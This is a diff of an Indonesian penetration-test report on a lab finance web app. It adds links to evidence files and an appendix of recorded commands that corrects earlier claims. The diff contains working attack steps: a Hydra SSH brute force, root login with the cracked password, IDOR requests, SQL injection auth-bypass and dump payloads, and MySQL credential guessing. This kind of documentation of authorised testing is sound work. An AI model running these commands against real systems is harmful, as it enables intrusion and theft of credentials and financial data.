@@ -10,7 +10,7 @@ dijalankan.
 
 > **Revisi 1.1 — koreksi berbasis bukti.** Versi sebelumnya mengalamatkan target di
 > `192.168.1.18` dan menyatakan `192.168.1.93` sudah mati karena DHCP. **Tidak ada satu
-> pun bukti yang mendukung itu.** Sebaliknya, `ping.png` menunjukkan `192.168.1.18`
+> pun bukti yang mendukung itu.** Sebaliknya, [`ping.png`](bukti-pentest/ping.png) menunjukkan `192.168.1.18`
 > menjawab 4 dari 4 paket (0% packet loss), dan seluruh 12 screenshot pada folder
 > `bukti-pentest/` diambil di `192.168.1.18` antara pukul 00:08 dan 00:47 WIB.
 > Narasi DHCP, bagian 0.1, dan bagian 0.3 versi lama dihapus karena bertentangan
@@ -21,7 +21,7 @@ dijalankan.
 | | Laporan lama (2026-09-27) | Laporan ini (versi 1.1) |
 |---|---|---|
 | IP target | 192.168.1.18 | **192.168.1.18** (sama — dikonfirmasi hidup, bukan DHCP) |
-| Identitas | MAC `08:00:27:81:9D:8D` | MAC **sama**, dikonfirmasi ulang di `scan-nmap.png` |
+| Identitas | MAC `08:00:27:81:9D:8D` | MAC **sama**, dikonfirmasi ulang di [`scan-nmap.png`](bukti-pentest/scan-nmap.png) |
 | Waktu uji | 2026-09-27 | **2026-09-29, 00:08–00:47 WIB** (sesuai stempel waktu bukti) |
 | Sumber akses | sudah pegang `root:Labkeu123` | **black-box, kredensial SSH ditebak & dipatahkan** |
 | Cara dapat secret session | baca `server.js` via SSH | **ditebak & dipecah tanpa akses sama sekali** |
@@ -42,15 +42,15 @@ urutan naratif draf sebelumnya:
 00:42  Brute force SSH          -> 24 percobaan, 2 detik: root / Labkeu123
      |
 00:44  Halaman login            -> percobaan grep kredensial  [2.png: TIDAK ADA OUTPUT]
-00:44  Login individu1          -> HTTP=302 -> /dashboard   [3.png]
+00:44  Login individu1          -> HTTP=302 -> /dashboard   [3.png](bukti-pentest/3.png)
 00:44  IDOR                     -> baca data keuangan perusahaan 2  [4.png - terbukti]
 00:44  SQLi ORDER BY            [5.png: TIDAK ADA OUTPUT]
 00:45  SQLi UNION auth bypass   -> HTTP=302  [6.png - "Masuk sebagai" tidak tercetak]
 00:45  SQLi dump kredensial     [7.png: TIDAK ADA OUTPUT]
      |
-00:46  Brute force MySQL        -> labkeu_user / labkeu_pass  [8.png]
-00:47  Dump basis data          -> 4 tabel, users polos, data_keuangan  [9.png]
-00:47  Konfirmasi root          -> uid=0(root), Alpine 3.24.2  [11.png]
+00:46  Brute force MySQL        -> labkeu_user / labkeu_pass  [8.png](bukti-pentest/8.png)
+00:47  Dump basis data          -> 4 tabel, users polos, data_keuangan  [9.png](bukti-pentest/9.png)
+00:47  Konfirmasi root          -> uid=0(root), Alpine 3.24.2  [11.png](bukti-pentest/11.png)
      |
 ROOT
 ```
@@ -61,8 +61,8 @@ ROOT
    Draf lama menulis SQLi sebagai jalur terpendek menuju root. Berdasarkan bukti,
    jalur terpendek yang benar-benar terekam justru brute force SSH — 24 percobaan
    dalam 2 detik.
-2. **Dump kredensial dilakukan lewat MySQL langsung (`9.png`), bukan lewat SQLi.**
-   Klaim "satu request SQLi mengosongkan database" **tidak terbukti**: `7.png`
+2. **Dump kredensial dilakukan lewat MySQL langsung ([`9.png`](bukti-pentest/9.png)), bukan lewat SQLi.**
+   Klaim "satu request SQLi mengosongkan database" **tidak terbukti**: [`7.png`](bukti-pentest/7.png)
    hanya memuat perintah tanpa output. Yang terbukti adalah MySQL terbuka dengan
    kredensial lemah, lalu dibaca langsung dengan `SELECT`.
 
@@ -83,7 +83,7 @@ sebaliknya tidak didukung bukti.
 ```bash
 ping -c 4 192.168.1.18
 ```
-**Output aktual** (`ping.png`, 00:08):
+**Output aktual** ([`ping.png`](bukti-pentest/ping.png), 00:08):
 ```
 64 bytes from 192.168.1.18: icmp_seq=1 ttl=64 time=10.5 ms
 64 bytes from 192.168.1.18: icmp_seq=2 ttl=64 time=2.32 ms
@@ -117,7 +117,7 @@ yang sama pada engagement sebelumnya.
 nmap -Pn -sV -p 22,3000,3307 192.168.1.18
 ```
 
-> **Catatan:** perintah yang benar-benar direkam (`scan-nmap.png`) **tidak memakai
+> **Catatan:** perintah yang benar-benar direkam ([`scan-nmap.png`](bukti-pentest/scan-nmap.png)) **tidak memakai
 > `-sC`**. Karena itu nomor versi Node.js dan Express **tidak dapat disimpulkan dari
 > bukti ini**. Nilai v20.20.2 / ^4.19.2 berasal dari pembacaan `package.json`
 > setelah akses root diperoleh. Jalankan ulang dengan `-sC` bila ingin bukti langsung.
@@ -130,7 +130,7 @@ Tidak ada listener TLS: tidak ada 443 maupun 8443 (dipakai ulang di #13).
 sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \
   "id; uname -a; cat /etc/alpine-release"
 ```
-**Output aktual** (`11.png`, 00:47):
+**Output aktual** ([`11.png`](bukti-pentest/11.png), 00:47):
 ```
 uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),...
 Linux localhost 6.18.52-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2026-09-15 05:37:48 x86_64 Linux
@@ -1274,14 +1274,14 @@ delapan). Ini yang membedakan laporan ini dari laporan lama.
 
 | # | Klaim laporan lama | Kenyataan di 192.168.1.18 | Tindakan |
 |---|---|---|---|
-| 1 | Target `192.168.1.93` dengan alasan `192.168.1.18` sudah mati | **Tidak didukung bukti apa pun.** `ping.png` membuktikan `192.168.1.18` hidup (0% loss), dan 12 bukti diambil di alamat itu | Target dikoreksi ke `192.168.1.18`; setiap temuan dianotasi ke berkasnya |
+| 1 | Target `192.168.1.93` dengan alasan `192.168.1.18` sudah mati | **Tidak didukung bukti apa pun.** [`ping.png`](bukti-pentest/ping.png) membuktikan `192.168.1.18` hidup (0% loss), dan 12 bukti diambil di alamat itu | Target dikoreksi ke `192.168.1.18`; setiap temuan dianotasi ke berkasnya |
 | 2 | Bukti listener pakai `ss -ltn` | **`ss` tidak ada** di host Alpine ini (`sh: ss: not found`). Evidence `ss` tidak reproducible. | Diganti `netstat -ltnp` |
 | 3 | Respons IDOR kosong = **22 byte**, heuristik `if size>22` | actuality `[]` = **2 byte**. Heuristik 22 salah. | Diganti hitung `grep -c '"perusahaan_id"'` |
 | 4 | "Pembersihan jejak" (LANGKAH 10) **selesai** | **False.** 4 akun uji & 22 baris `dokumen` masih ada. `/uploads/passwd` **live & publik**. | Diberi tahu; artefak saya sendiri sudah dihapus |
 | 5 | Self-register `perusahaan` langsung dapat akses data | Akun tsb `perusahaan_id=NULL`; dashboard **kosong**. Akses data baru jalan lewat **IDOR (#4)**, bukan langsung. | Nuance ditulis di #3 |
 | 6 | Count/hash dump creds countdown lewat kolom `password` | Teknik lama rapuh (GROUP_CONCAT limit + escaping). Subquery ke `nama_lengkap` lebih andal. | Teknik diganti di A.6 |
-| 7 | "Satu request SQLi mengosongkan database" | `7.png` **tidak menampilkan output**. Yang terbukti: dump lewat MySQL langsung (`9.png`) | Klaim diturunkan; dump SQLi ditandai belum terbukti |
-| 8 | Password root `labkeu123` | `10.png` dan `11.png` menunjukkan `Labkeu123` (kapital L) | Dikoreksi mengikuti bukti |
+| 7 | "Satu request SQLi mengosongkan database" | [`7.png`](bukti-pentest/7.png) **tidak menampilkan output**. Yang terbukti: dump lewat MySQL langsung ([`9.png`](bukti-pentest/9.png)) | Klaim diturunkan; dump SQLi ditandai belum terbukti |
+| 8 | Password root `labkeu123` | [`10.png`](bukti-pentest/10.png) dan [`11.png`](bukti-pentest/11.png) menunjukkan `Labkeu123` (kapital L) | Dikoreksi mengikuti bukti |
 
 **Yang tetap valid dari laporan lama** (masih terbukti, IP sama):
 seluruh kelas kerentanan, plus bukti negatif (source tak terekspos, dir-listing
@@ -1351,20 +1351,20 @@ mengikuti stempel waktu asli pada screenshot, bukan urutan naratif draf sebelumn
 # 0 - ALAT
 apt update && apt install -y nmap curl sshpass mysql-client netcat-openbsd tcpdump hydra
 
-# 1 - KONFIRMASI HOST HIDUP                                        [ping.png]
+# 1 - KONFIRMASI HOST HIDUP                                        [ping.png](bukti-pentest/ping.png)
 ping -c 4 192.168.1.18                        # -> 4/4 diterima, 0% packet loss
 
-# 2 - SCAN PORT & VERSI                                      [scan-nmap.png]
+# 2 - SCAN PORT & VERSI                                      [scan-nmap.png](bukti-pentest/scan-nmap.png)
 nmap -Pn -sV -p 22,3000,3307 192.168.1.18     # -> 22, 3000, 3307 terbuka
 # CATATAN: bukti aslinya tanpa -sC, jadi versi Node/Express tidak terambil
 
-# 3 - BRUTE FORCE SSH (TERLEBIH DINI, 00:42)                          [10.png]
+# 3 - BRUTE FORCE SSH (TERLEBIH DINI, 00:42)                          [10.png](bukti-pentest/10.png)
 printf 'root\nlabkeu\nadmin\nubuntu\n' > /tmp/u.txt
 printf 'Labkeu\nlabkeu123\npassword\npassword123\nroot123\ntoor\n' > /tmp/p.txt
 hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -W 3 -f 192.168.1.18 -s 22 ssh
 # -> 24 percobaan, 2 detik: root / Labkeu123
 
-# 4 - KONFIRMASI ROOT                                              [11.png]
+# 4 - KONFIRMASI ROOT                                              [11.png](bukti-pentest/11.png)
 sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \
   "id; uname -a; cat /etc/alpine-release"
 # -> uid=0(root), Alpine 3.24.2
@@ -1373,7 +1373,7 @@ sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \
 for p in "" register login-noportal dashboard search upload uploads/ api/perusahaan/1/data-keuangan; do
   curl -s -o /dev/null -w "GET /%-32s -> %{http_code}\n" "http://192.168.1.18:3000/$p"
 done
-curl -s http://192.168.1.18:3000/login | grep -oE 'Contoh akun:.*'   # [2.png] TIDAK ADA OUTPUT
+curl -s http://192.168.1.18:3000/login | grep -oE 'Contoh akun:.*'   # [2.png](bukti-pentest/2.png) TIDAK ADA OUTPUT
 
 # 6 - FOOTHOLD ANONIM (kredensial dari halaman publik)
 curl -s -c /tmp/cj_indiv -o /dev/null -X POST http://192.168.1.18:3000/login -d "username=individu1&password=password123"
@@ -1439,3 +1439,225 @@ instansi fiktif, **bukan** GEMATI/BBGTK asli.
 
 Tidak ada data produksi tersentuh, tidak ada denial-of-service, tidak ada payload
 merusak. Semua file uji dibuat dari konten dummy dan dihapus kembali.
+
+---
+
+## Lampiran — Bukti Visual
+
+Dua belas screenshot asli, sama dengan Lampiran D di `laporan.md`.
+
+Dua belas screenshot asli dari pengujian, tersimpan di `bukti-pentest/`. Nomor di kiri adalah jam penangkapan (WIB). Yang bertanda **belum terbukti** memang direkam tanpa output — sengaja dibiarkan apa adanya, bukan dihapus, supaya klaim yang tidak terbukti bisa dinilai sendiri oleh pembaca.
+
+### [`ping.png`](bukti-pentest/ping.png) — Keterjangkauan host
+
+**Jam 00:08 WIB.**
+
+![Keterjangkauan host — ping.png](bukti-pentest/ping.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+64 bytes from 192.168.1.18: icmp_seq=1 ttl=64 time=10.5 ms
+64 bytes from 192.168.1.18: icmp_seq=2 ttl=64 time=2.32 ms
+64 bytes from 192.168.1.18: icmp_seq=3 ttl=64 time=1.95 ms
+64 bytes from 192.168.1.18: icmp_seq=4 ttl=64 time=1.12 ms
+4 packets transmitted, 4 received, 0% packet loss, time 3006ms
+rtt min/avg/max/mdev = 1.115/3.966/10.472/3.781 ms
+```
+
+</details>
+
+### [`scan-nmap.png`](bukti-pentest/scan-nmap.png) — Port dan versi layanan
+
+**Jam 00:10 WIB.**
+
+![Port dan versi layanan — scan-nmap.png](bukti-pentest/scan-nmap.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+22/tcp    open  ssh     OpenSSH 10.3 (protocol 2.0)
+3000/tcp  open  http    Node.js Express framework
+3307/tcp  open  mysql   MySQL 8.0.46
+MAC Address: 08:00:27:81:9D:8D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+</details>
+
+### [`2.png`](bukti-pentest/2.png) — Kredensial pada halaman publik
+
+**Jam 00:44 WIB.**
+
+![Kredensial pada halaman publik — 2.png](bukti-pentest/2.png)
+
+> **Belum terbukti.** Tidak ada output tercetak — belum terbukti.
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ curl -s http://192.168.1.18:3000/login | grep -oE 'Contoh akun:.*'
+— TIDAK ADA OUTPUT TERCETAK —
+```
+
+</details>
+
+### [`3.png`](bukti-pentest/3.png) — Login foothold
+
+**Jam 00:44 WIB.**
+
+![Login foothold — 3.png](bukti-pentest/3.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ curl -s -c /tmp/c ... -X POST http://192.168.1.18:3000/login -d username=individu1&password=REDACTED_STORED_PASSWORD
+HTTP=302 -> http://192.168.1.18:3000/dashboard
+```
+
+</details>
+
+### [`4.png`](bukti-pentest/4.png) — IDOR data keuangan lintas perusahaan
+
+**Jam 00:44 WIB.**
+
+![IDOR data keuangan lintas perusahaan — 4.png](bukti-pentest/4.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ curl -s -b /tmp/c http://192.168.1.18:3000/api/perusahaan/2/data-keuangan
+[{"id":3,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement transport peserta","nominal":"980000.00"},
+ {"id":4,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement konsumsi kegiatan","nominal":"2150000.00"}]
+```
+
+</details>
+
+### [`5.png`](bukti-pentest/5.png) — SQLi - penentuan jumlah kolom
+
+**Jam 00:44 WIB.**
+
+![SQLi - penentuan jumlah kolom — 5.png](bukti-pentest/5.png)
+
+> **Belum terbukti.** Tidak ada output tercetak — belum terbukti.
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ curl -s -X POST .../login-noportal --data-urlencode "username=user_a' ORDER BY 7-- -" ...
+— TIDAK ADA OUTPUT TERCETAK —
+```
+
+</details>
+
+### [`6.png`](bukti-pentest/6.png) — SQLi - auth bypass
+
+**Jam 00:45 WIB.**
+
+![SQLi - auth bypass — 6.png](bukti-pentest/6.png)
+
+> **Belum terbukti.** Baris `Masuk sebagai: BlackHat` tidak tercetak; yang terbukti hanya redirect 302.
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ curl -s -c /tmp/s ... --data-urlencode "username=x' UNION SELECT 1,'hacker','x','perusahaan','BlackHat',1-- -"
+HTTP=302 -> http://192.168.1.18:3000/dashboard
+— Baris 'Masuk sebagai: BlackHat' TIDAK tercetak —
+```
+
+</details>
+
+### [`7.png`](bukti-pentest/7.png) — SQLi - dump kredensial
+
+**Jam 00:45 WIB.**
+
+![SQLi - dump kredensial — 7.png](bukti-pentest/7.png)
+
+> **Belum terbukti.** Tidak ada output tercetak — belum terbukti.
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ P="x' UNION SELECT 1,'p','x','perusahaan',(SELECT GROUP_CONCAT(...) FROM users),1-- -"
+$ curl -s -c /tmp/d -o /dev/null -X POST .../login-noportal --data-urlencode username=$P ...
+— TIDAK ADA OUTPUT TERCETAK; hasil dump tidak terbukti —
+```
+
+</details>
+
+### [`8.png`](bukti-pentest/8.png) — Brute force MySQL port 3307
+
+**Jam 00:46 WIB.**
+
+![Brute force MySQL port 3307 — 8.png](bukti-pentest/8.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ for u in root labkeu_user labkeu admin; do for p in "" root REDACTED_WEAK_PASSWORD REDACTED_DB_PASSWORD REDACTED_STORED_PASSWORD REDACTED_DB_PASSWORD; ...
+TEMUKAN: labkeu_user / REDACTED_DB_PASSWORD
+```
+
+</details>
+
+### [`9.png`](bukti-pentest/9.png) — Dump penuh basis data
+
+**Jam 00:47 WIB.**
+
+![Dump penuh basis data — 9.png](bukti-pentest/9.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+| Tables_in_labkeu | data_keuangan, dokumen, perusahaan, users  (4 tabel)
+| 1  | user_a     | REDACTED_STORED_PASSWORD | perusahaan | Admin CV Sinar Abadi | 1        |
+| 2  | user_b     | REDACTED_STORED_PASSWORD | perusahaan | Admin PT Maju Bersama| 2        |
+| 3  | individu1  | REDACTED_STORED_PASSWORD | individu   | Budi Santoso        | NULL     |
+| 11 | test_individu_$(date %s) | REDACTED_TEST_PASSWORD | individu | Test Individu | NULL    |
+| 13 | zzz_unique_18950 | REDACTED_TEST_PASSWORD | individu | Test | NULL |
+| 14 | zzz_csrf_31965     | REDACTED_TEST_PASSWORD | individu | Test | NULL |
+| 20 | esc_audit          | REDACTED_TEST_PASSWORD | perusahaan| Audit | NULL |
+| data_keuangan: 4 baris, perusahaan_id 1 (2 baris) dan 2 (2 baris) |
+```
+
+</details>
+
+### [`10.png`](bukti-pentest/10.png) — Brute force SSH dengan Hydra
+
+**Jam 00:42 WIB.**
+
+![Brute force SSH dengan Hydra — 10.png](bukti-pentest/10.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ printf 'root\nlabkeu\nadmin\nubuntu\n' > /tmp/u.txt
+$ printf 'Labkeu\nREDACTED_DB_PASSWORD\npassword\nREDACTED_STORED_PASSWORD\nREDACTED_STORED_PASSWORD\ntoor\n' > /tmp/p.txt
+$ hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -W 3 -f 192.168.1.18 -s 22 ssh
+Hydra v9.7 starting at 2026-09-29 00:42:52
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 24 login tries (1:4/p:6)
+[22][ssh] host: 192.168.1.18 login: root password: REDACTED_SSH_ROOT_PW
+[STATUS] attack finished for 192.168.1.18 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+finished at 2026-09-29 00:42:54
+```
+
+</details>
+
+### [`11.png`](bukti-pentest/11.png) — Akses root terkonfirmasi
+
+**Jam 00:47 WIB.**
+
+![Akses root terkonfirmasi — 11.png](bukti-pentest/11.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ sshpass -p 'REDACTED_SSH_ROOT_PW' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "id; uname -a; cat /etc/alpine-release"
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),...
+Linux localhost 6.18.52-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2026-09-15 05:37:48 x86_64 Linux
+3.24.2
+```
+
+</details>
+
